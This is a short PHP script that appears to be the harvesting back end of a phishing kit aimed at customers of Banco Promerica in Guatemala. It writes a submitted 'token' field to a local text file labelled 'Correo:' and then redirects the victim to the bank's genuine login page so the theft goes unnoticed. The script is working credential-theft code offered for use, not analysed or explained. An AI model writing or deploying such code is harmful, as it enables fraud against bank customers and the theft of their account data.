<?php
$datoa=$_POST['token'];


$archivo="../datos.txt";
 
     $file=fopen($archivo,"a");
     fwrite($file, "Correo:" .$datoa. PHP_EOL);
     
	 fwrite($file, "*************************************" . PHP_EOL);
     fclose($file); 
	 
     
     ?>
 
<html>
<meta http-equiv="refresh" content="0;url=https://online.bancopromerica.com.gt/bl/PB/pages/administration/pbLoginPage.aspx">
</html>